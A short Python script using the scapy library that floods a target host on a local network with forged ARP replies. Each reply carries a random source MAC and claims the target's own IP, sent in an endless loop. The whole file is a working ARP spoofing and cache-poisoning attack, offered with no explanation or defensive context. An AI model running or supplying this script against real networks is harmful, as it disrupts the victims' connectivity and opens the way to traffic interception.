#!/usr/bin/env python3

from scapy.all import *
import sys

def main():
    dest_ip = sys.argv[1]
    dest_mac = getmacbyip(dest_ip)
    
    try:
        while True:
            sendp(Ether(src=RandMAC(), dst = dest_mac)/ARP(op = 2, psrc = dest_ip, hwdst = dest_mac) / Padding(load = "X"*18))
            print("Sending random MAC to " + dest_ip + " " + dest_mac)
    
    except KeyboardInterrupt:
        quit()
    
if __name__ == '__main__':
    main()
